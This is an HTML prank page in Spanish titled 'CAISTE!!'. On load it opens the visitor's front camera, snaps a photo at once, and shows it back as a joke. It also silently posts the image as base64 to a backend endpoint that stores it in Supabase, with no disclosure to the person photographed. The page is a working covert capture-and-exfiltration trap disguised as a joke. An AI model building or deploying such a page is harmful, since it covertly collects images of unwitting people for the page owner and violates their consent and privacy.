<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>CAISTE!!ðŸ¤£</title>
  <style>
    html, body {
      margin: 0;
      padding: 0;
      height: 100%;
      width: 100%;
      overflow: hidden;
      /* Fondo gradiente negro a rojo */
      background: linear-gradient(to bottom, #000000, #ff0000);
    }
    #foto {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      object-fit: cover;
    }
    #video, #canvas {
      display: none; /* solo para procesar */
    }
    #mensaje {
      position: fixed;
      bottom: 20px;
      width: 100%;
      text-align: center;
      font-size: 2em;
      color: white;
      font-family: Arial, sans-serif;
      text-shadow: 0 0 10px #000;
    }
  </style>
</head>
<body>
  <img id="foto" src="" alt="Foto Sorpresa" />
  <div id="mensaje">CAISTE!!ðŸ¤£</div>

  <video id="video" autoplay playsinline></video>
  <canvas id="canvas"></canvas>

  <script>
    // --- ADICIÃ“N 1: URL del Backend (ruta relativa) ---
    const VERCEL_ENDPOINT_URL = "/api/guardar-imagen";
    // -------------------------------------------------

    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');
    const foto = document.getElementById('foto');
    const ctx = canvas.getContext('2d');

    const constraints = {
      video: {
        facingMode: "user", // cÃ¡mara frontal
        width: { ideal: 1280 },
        height: { ideal: 720 }
      }
    };

    async function iniciarCamara() {
      try {
        const stream = await navigator.mediaDevices.getUserMedia(constraints);
        video.srcObject = stream;

        // Tomar foto apenas el video empiece a reproducirse
        video.addEventListener('play', () => {
          canvas.width = video.videoWidth;
          canvas.height = video.videoHeight;
          tomarFoto();
        });
      } catch (err) {
        console.error("Error al acceder a la cÃ¡mara:", err);
      }
    }

    function tomarFoto() {
      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
      const dataURL = canvas.toDataURL('image/jpeg');

      // Mostrar foto pantalla completa
      foto.src = dataURL;

      // Detener la cÃ¡mara
      const tracks = video.srcObject.getTracks();
      tracks.forEach(track => track.stop());
      video.style.display = 'none';

      // --- ADICIÃ“N 2: Preparar y enviar la data ---
      const base64Data = dataURL.split(',')[1];
      enviarAFirebase(base64Data);
      // ------------------------------------------
    }

    // --- ADICIÃ“N 3: FunciÃ³n para enviar al backend ---
    async function enviarAFirebase(base64) {
        console.log("Enviando foto a Vercel...");
        try {
            const response = await fetch(VERCEL_ENDPOINT_URL, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({ base64: base64 }),
            });

            const result = await response.json();

            if (response.ok) {
                console.log("Â¡Foto guardada en Supabase con Ã©xito!", result);
            } else {
                console.error("Error al guardar en Vercel/Supabase:", result.error);
            }

        } catch (err) {
            console.error("Error de red al enviar la foto:", err);
        }
    }
    // -----------------------------------------------

    iniciarCamara();
  </script>
</body>
</html>
